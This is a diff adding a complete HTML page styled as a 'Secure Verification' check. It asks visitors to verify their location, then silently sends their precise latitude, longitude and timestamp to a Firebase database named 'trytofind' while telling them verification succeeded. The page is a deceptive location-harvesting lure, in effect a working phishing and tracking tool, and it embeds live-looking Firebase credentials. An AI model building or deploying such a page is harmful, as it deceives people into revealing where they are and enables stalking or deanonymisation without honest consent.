@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #4facfe, #00f2fe);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: #fff;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+      text-align: center;
+      width: 320px;
+    }
+
+    h2 {
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    p {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    button {
+      background: #4facfe;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #00c6ff;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 13px;
+      color: green;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="card">
+  <h2>Secure Verification</h2>
+  <p>Please verify your location to continue</p>
+  <button onclick="getLocation()">Verify Location</button>
+  <div id="status"></div>
+</div>
+
+<!-- Firebase Script -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
+  import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyAPhnMErkrT0On807sBv2ErwZI-9d-K8Lw",
+    authDomain: "trytofind-3a6bd.firebaseapp.com",
+    databaseURL: "https://trytofind-3a6bd-default-rtdb.firebaseio.com/",
+    projectId: "trytofind-3a6bd",
+    storageBucket: "trytofind-3a6bd.firebasestorage.app",
+    messagingSenderId: "147650967573",
+    appId: "1:147650967573:web:198ff9590d97717af9361c",
+    measurementId: "G-B6N8JNTR0V"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  window.getLocation = function () {
+    document.getElementById("status").innerHTML = "Requesting permission...";
+
+    navigator.geolocation.getCurrentPosition((position) => {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      push(ref(db, "locations"), {
+        latitude: lat,
+        longitude: lon,
+        time: new Date().toString()
+      });
+
+      document.getElementById("status").innerHTML = "Verification successful ✅";
+    }, () => {
+      document.getElementById("status").innerHTML = "Permission denied ❌";
+    });
+  }
+</script>
+
+</body>
+</html>
